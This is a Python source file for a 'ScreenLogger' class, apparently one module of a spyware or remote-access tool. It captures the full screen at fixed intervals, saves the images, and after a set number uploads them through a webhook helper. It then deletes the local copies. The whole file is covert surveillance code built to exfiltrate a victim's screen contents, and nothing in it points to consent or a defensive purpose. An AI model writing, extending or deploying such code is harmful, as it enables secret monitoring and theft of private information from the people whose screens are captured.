import PIL.ImageGrab
import time
import os

from config import LOG_DIRECTORY_PATH, SCREENSHOT_INTERVAL_SEC, SCREENSHOTS_BEFORE_SEND
from utils.logging_utils import log_error, log_info
from utils.webhook_utils import send_log_files_in_directory
from utils.file_utils import clear_files_in_log_directory

class ScreenLogger:
    def __init__(self):
        self.logs_directory = "screenshots"
        self.logs_directory_path = os.path.join(LOG_DIRECTORY_PATH, self.logs_directory)
        self.interval = SCREENSHOT_INTERVAL_SEC
        self.counter_max = SCREENSHOTS_BEFORE_SEND
        self.counter = 0
        self.running = True

    def log_screen(self):
        screenshot = PIL.ImageGrab.grab()
        screenshot.save(os.path.join(self.logs_directory_path, f"{self.logs_directory_path}/{self.counter}.png"))
        screenshot.close()
        log_info(f"Logged screenshot to {os.path.join(self.logs_directory_path, f'{self.counter}.png')}")
        self.increment_and_check_counter()

    def increment_and_check_counter(self):
        self.counter += 1
        if self.counter >= self.counter_max:
            send_log_files_in_directory(f"`Sending screenshot logs...`", self.logs_directory)
            clear_files_in_log_directory(self.logs_directory)
            log_info("Sent and cleared screenshot log files.")
            self.counter = 0

    def run(self):
        try:
            while self.running:
                self.log_screen()
                time.sleep(self.interval)
        except Exception as e:
            self.running = False
            log_error(e)